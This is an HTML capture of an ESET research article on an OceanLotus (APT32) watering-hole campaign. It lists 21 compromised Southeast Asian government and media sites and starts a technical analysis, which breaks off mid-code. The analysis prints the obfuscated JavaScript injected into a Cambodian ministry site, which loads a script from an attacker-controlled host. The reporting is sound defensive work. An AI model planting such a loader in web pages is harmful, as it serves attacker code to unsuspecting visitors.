<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/css/main-8633bd3c28.css" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'Matthieu Faou',
        'ArticleCategory': 'Malware',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>
<script>(function() {
  var _fbq = window._fbq || (window._fbq = []);
  if (!_fbq.loaded) {
    var fbds = document.createElement('script');
    fbds.async = true;
    fbds.src = '//connect.facebook.net/en_US/fbds.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(fbds, s);
    _fbq.loaded = true;
  }
  _fbq.push(['addPixelId', '1518099328403839']);
})();
window._fbq = window._fbq || [];
window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=1518099328403839&amp;ev=NoScript" /></noscript>
<meta property="fb:pages" content="56844830907" />
<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>OceanLotus: New watering hole attack in Southeast Asia | WeLiveSecurity</title>
<meta name="description" content="ESET researchers have discovered a new watering hole campaign targeting several websites in Southeast Asia, believed to have been active since September 2018. Among the compromised websites were the Ministry of Defense of Cambodia, the Ministry of Foreign Affairs and International Cooperation of Cambodia."/>
<link rel="canonical" href="https://www.welivesecurity.com/2018/11/20/oceanlotus-new-watering-hole-attack-southeast-asia/" />
<meta property="og:locale" content="en_US" />
<meta property="og:locale:alternate" content="fr_FR" />
<meta property="og:locale:alternate" content="de_DE" />
<meta property="og:type" content="article" />
<meta property="og:title" content="OceanLotus: New watering hole attack in Southeast Asia | WeLiveSecurity" />
<meta property="og:description" content="ESET researchers have discovered a new watering hole campaign targeting several websites in Southeast Asia, believed to have been active since September 2018. Among the compromised websites were the Ministry of Defense of Cambodia, the Ministry of Foreign Affairs and International Cooperation of Cambodia." />
<meta property="og:url" content="https://www.welivesecurity.com/2018/11/20/oceanlotus-new-watering-hole-attack-southeast-asia/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:section" content="Malware" />
<meta property="article:published_time" content="2018-11-20T13:56:03+00:00" />
<meta property="article:modified_time" content="2018-11-20T13:56:50+00:00" />
<meta property="og:updated_time" content="2018-11-20T13:56:50+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2018/11/ladybower-reservoir-3129737_1920.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2018/11/ladybower-reservoir-3129737_1920.jpg" />
<meta property="og:image:width" content="1920" />
<meta property="og:image:height" content="1280" />
<meta property="og:image:alt" content="Southeast Asia" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="ESET researchers have discovered a new watering hole campaign targeting several websites in Southeast Asia, believed to have been active since September 2018. Among the compromised websites were the Ministry of Defense of Cambodia, the Ministry of Foreign Affairs and International Cooperation of Cambodia." />
<meta name="twitter:title" content="OceanLotus: New watering hole attack in Southeast Asia | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2018/11/ladybower-reservoir-3129737_1920.jpg" />
<meta name="twitter:creator" content="@matthieu_faou" />
<!-- / Yoast SEO plugin. -->

<link rel='stylesheet' id='crayon-theme-github-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/themes/github/github.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel="alternate" href="https://www.welivesecurity.com/fr/2018/11/21/oceanlotus-asie-du-sud-est/" hreflang="fr" />
<link rel="alternate" href="https://www.welivesecurity.com/2018/11/20/oceanlotus-new-watering-hole-attack-southeast-asia/" hreflang="en" />
<link rel="alternate" href="https://www.welivesecurity.com/deutsch/2018/11/20/oceanlotus-watering-hole-attack-suedost-asien/" hreflang="de" />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">
</head>
<body class="no-js single wide">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="col-xs-12 mobile-search-input">
                        <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                    </div>
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/2018/11/21/oceanlotus-asie-du-sud-est/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2018/11/20/oceanlotus-watering-hole-attack-suedost-asien/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="hidden-lg hidden-md hidden-sm hidden-xs col-xs-2 mobile-search imc">
                        <button class="imc">
                            <span class="icomoon icon-icon_search imc"></span>
                        </button>
                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/podcasts/">
                                            Podcasts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/2018/11/21/oceanlotus-asie-du-sud-est/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2018/11/20/oceanlotus-watering-hole-attack-suedost-asien/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                                <div class="hidden-lg hidden-md col-xs-12 imc">
                                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                                </div>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
                <div class="row hidden-sm hidden-xs">
                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc  col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong> 
					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-wide" style="background-image: url('../../../../wp-content/uploads/2018/11/ladybower-reservoir-3129737_1920.jpg'); background-position: 50% 50%;">
    <div class="text-wrapper">
        <div class="container promo-text">
            <div class="col-md-11 col-sm-11 col-xs-12 no-padding">
                <h1>OceanLotus: New watering hole attack in Southeast Asia</h1>
<div class="excerpt">ESET researchers identified 21 distinct websites that had been compromised including some particularly notable government and media sites</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/mfaou/" title="Matthieu Faou">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2021/02/Matthieu-Faou-222x179.jpg" alt="Matthieu Faou">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/mfaou/" title="Matthieu Faou">
                    Matthieu Faou                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2018-11-20 14:56:03">20 Nov 2018 - 02:56PM</time>
		</span>
			</span>
</div>
            </div>
        </div>
    </div>
</div>

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2018%2F11%2F20%2Foceanlotus-new-watering-hole-attack-southeast-asia%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2018%2F11%2F20%2Foceanlotus-new-watering-hole-attack-southeast-asia%2F&text=OceanLotus: New watering hole attack in Southeast Asia%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2018%2F11%2F20%2Foceanlotus-new-watering-hole-attack-southeast-asia%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt wide">
                                <p>ESET researchers identified 21 distinct websites that had been compromised including some particularly notable government and media sites</p>
                            </div>

                            <p>ESET researchers have discovered a new watering hole campaign targeting several websites in Southeast Asia, and that is believed to have been active since September 2018. This campaign stands out because of its large scale, as we were able to identify 21 compromised websites, some of which are particularly notable. Among the compromised websites were the Ministry of Defense of Cambodia, the Ministry of Foreign Affairs and International Cooperation of Cambodia and several Vietnamese newspaper or blog websites.</p>
<p>After thorough analysis, we are highly confident that this campaign is run by the OceanLotus group [1], also known as APT32 [2] and APT-C-00. OceanLotus is an espionage group active since at least 2012 [3], mainly interested in foreign governments and dissidents.</p>
<p>This campaign is believed to be an evolution of what Volexity researchers called OceanLotus Framework B, a watering hole scheme they documented in 2017 [4]. However, the attackers have stepped up their game to complicate and slow down analysis of their malicious framework. Among the various improvements, they started using public key cryptography to exchange an AES session key, used to encrypt further communications, thus preventing security products from intercepting the final payload. They also switched from HTTP to WebSocket to hide their malicious communications.</p>
<p>ESET researchers identified 21 distinct websites that had been compromised, each redirecting to a separate domain controlled by the attackers.</p>
<p>Figure 1 shows the region targeted by this campaign.</p>
<div id="attachment_118999" style="width: 1610px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2018/11/SE_Asia_map-1.png"><img class="size-full wp-image-118999" src="/wp-content/uploads/2018/11/SE_Asia_map-1.png" alt="" width="1600" height="1080" srcset="https://www.welivesecurity.com/wp-content/uploads/2018/11/SE_Asia_map-1.png 1600w, https://www.welivesecurity.com/wp-content/uploads/2018/11/SE_Asia_map-1-300x203.png 300w, https://www.welivesecurity.com/wp-content/uploads/2018/11/SE_Asia_map-1-768x518.png 768w, https://www.welivesecurity.com/wp-content/uploads/2018/11/SE_Asia_map-1-1024x691.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2018/11/SE_Asia_map-1-151x103.png 151w, https://www.welivesecurity.com/wp-content/uploads/2018/11/SE_Asia_map-1-114x76.png 114w, https://www.welivesecurity.com/wp-content/uploads/2018/11/SE_Asia_map-1-97x65.png 97w" sizes="(max-width: 1600px) 100vw, 1600px" /></a><p class="wp-caption-text">Figure 1 &#8211; Location of the compromised websites</p></div>
<p>Most of the compromised domains are related to news media or the Cambodian government. The following table details the different victims. We notified all of them in October but most are still serving malicious script injections at the time of writing, two months after the first compromise. Thus, we encourage you <strong>not</strong> to visit these websites.</p>

<table id="tablepress-607" class="tablepress tablepress-id-607">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Compromised domain</th><th class="column-2">Description</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">baotgm[.]net</td><td class="column-2">Media in Vietnamese (based in Arlington, Texas)</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">cnrp7[.]org</td><td class="column-2">Cambodia National Rescue Party</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">conggiaovietnam[.]net</td><td class="column-2">Related to Religion – In Vietnamese</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">daichungvienvinhthanh[.]com</td><td class="column-2">Related to Religion – In Vietnamese</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">danchimviet[.]info</td><td class="column-2">Media in Vietnamese</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">danviet[.]vn</td><td class="column-2">Media in Vietnamese</td>
</tr>
<tr class="row-8 even">
	<td class="column-1">danviethouston[.]com</td><td class="column-2">Media in Vietnamese</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1">fvpoc[.]org</td><td class="column-2">Former Vietnamese Prisoners of Conscience</td>
</tr>
<tr class="row-10 even">
	<td class="column-1">gardencityclub[.]com</td><td class="column-2">Golf club in Phnom Penh, Kingdom of Cambodia</td>
</tr>
<tr class="row-11 odd">
	<td class="column-1">lienketqnhn[.]org</td><td class="column-2">Media in Vietnamese</td>
</tr>
<tr class="row-12 even">
	<td class="column-1">mfaic.gov[.]kh</td><td class="column-2">Ministry of Foreign Affairs and International Cooperation of Cambodia</td>
</tr>
<tr class="row-13 odd">
	<td class="column-1">mod.gov[.]kh</td><td class="column-2">Ministry of Defense of Cambodia</td>
</tr>
<tr class="row-14 even">
	<td class="column-1">mtgvinh[.]net</td><td class="column-2">Related to Religion – In Vietnamese</td>
</tr>
<tr class="row-15 odd">
	<td class="column-1">nguoitieudung.com[.]vn</td><td class="column-2">Media in Vietnamese</td>
</tr>
<tr class="row-16 even">
	<td class="column-1">phnompenhpost[.]com</td><td class="column-2">Cambodian newspaper in English</td>
</tr>
<tr class="row-17 odd">
	<td class="column-1">raovatcalitoday[.]com</td><td class="column-2">Unknown – In Vietnamese</td>
</tr>
<tr class="row-18 even">
	<td class="column-1">thongtinchongphandong[.]com</td><td class="column-2">Opposition media in Vietnamese</td>
</tr>
<tr class="row-19 odd">
	<td class="column-1">tinkhongle[.]com</td><td class="column-2">Media in Vietnamese</td>
</tr>
<tr class="row-20 even">
	<td class="column-1">toithichdoc.blogspot[.]com</td><td class="column-2">Blog in Vietnamese</td>
</tr>
<tr class="row-21 odd">
	<td class="column-1">trieudaiviet[.]com</td><td class="column-2">Unknown – In Vietnamese</td>
</tr>
<tr class="row-22 even">
	<td class="column-1">triviet[.]news</td><td class="column-2">Media in Vietnamese</td>
</tr>
</tbody>
</table>

<p><em>Table 1 &#8211; Description of the compromised websites</em></p>
<p>Generally, in a watering hole attack, the adversaries compromise websites that are regularly visited by potential targets. However, in this attack, OceanLotus was also able to compromise some websites that attract large numbers of visitors in general, not just their presumed targets. The following table shows the <a href="https://www.alexa.com/siteinfo" target="_blank" rel="noopener">Alexa rank</a> at the time of writing (the lower the rank, the more visited) of the compromised websites. For instance, they compromised the Dan Viet newspaper website (danviet[.]vn), which is the 116<sup>th</sup> most visited website in Vietnam.</p>

<table id="tablepress-608" class="tablepress tablepress-id-608">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Domain</th><th class="column-2">Alexa rank (global)</th><th class="column-3">Alexa rank (in the most popular country)</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">danviet[.]vn</td><td class="column-2">12,887</td><td class="column-3">116</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">phnompenhpost[.]com</td><td class="column-2">85,910</td><td class="column-3">18,880</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">nguoitieudung.com[.]vn</td><td class="column-2">261,801</td><td class="column-3">2,397</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">danchimviet[.]info</td><td class="column-2">287,852</td><td class="column-3">144,884</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">baotgm[.]net</td><td class="column-2">675,669</td><td class="column-3">119,737</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">toithichdoc.blogspot[.]com</td><td class="column-2">700,470</td><td class="column-3">11,532</td>
</tr>
<tr class="row-8 even">
	<td class="column-1">mfaic.gov[.]kh</td><td class="column-2">978,165</td><td class="column-3">2,149</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1">conggiaovietnam[.]net</td><td class="column-2">1,040,548</td><td class="column-3">15,368</td>
</tr>
<tr class="row-10 even">
	<td class="column-1">thongtinchongphandong[.]com</td><td class="column-2">1,134,691</td><td class="column-3">21,575</td>
</tr>
<tr class="row-11 odd">
	<td class="column-1">tinkhongle[.]com</td><td class="column-2">1,301,722</td><td class="column-3">15,224</td>
</tr>
<tr class="row-12 even">
	<td class="column-1">daichungvienvinhthanh[.]com</td><td class="column-2">1,778,418</td><td class="column-3">23,428</td>
</tr>
<tr class="row-13 odd">
	<td class="column-1">triviet[.]news</td><td class="column-2">2,767,289</td><td class="column-3">Not available</td>
</tr>
<tr class="row-14 even">
	<td class="column-1">mod.gov[.]kh</td><td class="column-2">4,247,649</td><td class="column-3">3,719</td>
</tr>
<tr class="row-15 odd">
	<td class="column-1">raovatcalitoday[.]com</td><td class="column-2">8,180,358</td><td class="column-3">Not available</td>
</tr>
<tr class="row-16 even">
	<td class="column-1">cnrp7[.]org</td><td class="column-2">8,411,693</td><td class="column-3">Not available</td>
</tr>
<tr class="row-17 odd">
	<td class="column-1">mtgvinh[.]net</td><td class="column-2">8,415,468</td><td class="column-3">Not available</td>
</tr>
<tr class="row-18 even">
	<td class="column-1">danviethouston[.]com</td><td class="column-2">8,777,564</td><td class="column-3">Not available</td>
</tr>
<tr class="row-19 odd">
	<td class="column-1">lienketqnhn[.]org</td><td class="column-2">16,109,635</td><td class="column-3">Not available</td>
</tr>
<tr class="row-20 even">
	<td class="column-1">gardencityclub[.]com</td><td class="column-2">16,109,635</td><td class="column-3">Not available</td>
</tr>
<tr class="row-21 odd">
	<td class="column-1">trieudaiviet[.]com</td><td class="column-2">16,969,048</td><td class="column-3">Not available</td>
</tr>
<tr class="row-22 even">
	<td class="column-1">fvpoc[.]org</td><td class="column-2">Not available</td><td class="column-3">Not available</td>
</tr>
</tbody>
</table>

<p><em>Table 2 &#8211; Alexa rank of the compromised websites</em></p>
<h1>Analysis</h1>
<p>The modus operandi is similar on all compromised websites. The attackers add a small piece of JavaScript code either in the index page or in a JavaScript file hosted on the same server. The piece of code in Figure 2, slightly obfuscated, then loads another script from a server controlled by the attackers. The following code, added in <span style="font-family: courier new, courier, monospace">https://www.mfaic.gov[.]kh/wp-content/themes/ministry-of-foreign-affair/slick/slick.min.js</span>, will load the file from <span style="font-family: courier new, courier, monospace">https://weblink.selfip[.]info/images/cdn.js?from=maxcdn</span>.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581bc152870752428981" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">JavaScript</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
(function() {
    var pt = "http";
    var l = document.createElement('script');
    l.src = pt + "s://" + arguments[0] + arguments[2] + arguments[3] + 'ip.' + 'info/images/cdn.js?from=maxcdn';
    document.getElementsByTagName('body')[0].appendChild(l)
})('web', 'a', 'link', '.self');</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581bc152870752428981-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc152870752428981-2">2</div><div class="crayon-num" data-line="crayon-60581bc152870752428981-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc152870752428981-4">4</div><div class="crayon-num" data-line="crayon-60581bc152870752428981-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc152870752428981-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581bc152870752428981-1"><span class="crayon-sy">(</span><span class="crayon-t">function</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc152870752428981-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-e ">pt</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"http"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581bc152870752428981-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">l</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-e">createElement</span><span class="crayon-sy">(</span><span class="crayon-s">'script'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc152870752428981-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">l</span><span class="crayon-sy">.</span><span class="crayon-v">src</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">pt</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"s://"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-r">arguments</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-r">arguments</span><span class="crayon-sy">[</span><span 